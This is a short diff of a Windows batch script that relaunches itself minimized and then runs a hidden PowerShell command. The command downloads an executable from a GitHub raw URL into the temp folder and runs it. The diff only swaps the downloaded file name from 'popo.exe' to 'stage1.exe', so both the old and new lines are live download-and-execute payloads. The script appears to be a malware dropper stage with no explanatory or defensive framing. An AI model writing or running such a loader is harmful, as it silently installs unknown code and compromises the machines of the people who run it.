@@ -47,5 +47,6 @@ if not defined IS_MINIMIZED (
     start /min "" "%~f0" %*
     exit /b
 )
-powershell.exe -NoProfile -WindowStyle Hidden -Command "$url = 'https://github.com/Oyenonada/oyenonada/raw/refs/heads/main/popo.exe'; $out = Join-Path $env:TEMP 'stage1.exe'; Invoke-WebRequest -Uri $url -OutFile $out; Start-Process -FilePath $out"
+powershell.exe -NoProfile -WindowStyle Hidden -Command "$url = 'https://github.com/Oyenonada/oyenonada/raw/refs/heads/main/stage1.exe'; $out = Join-Path $env:TEMP 'stage1.exe'; Invoke-WebRequest -Uri $url -OutFile $out; Start-Process -FilePath $out"
+
 
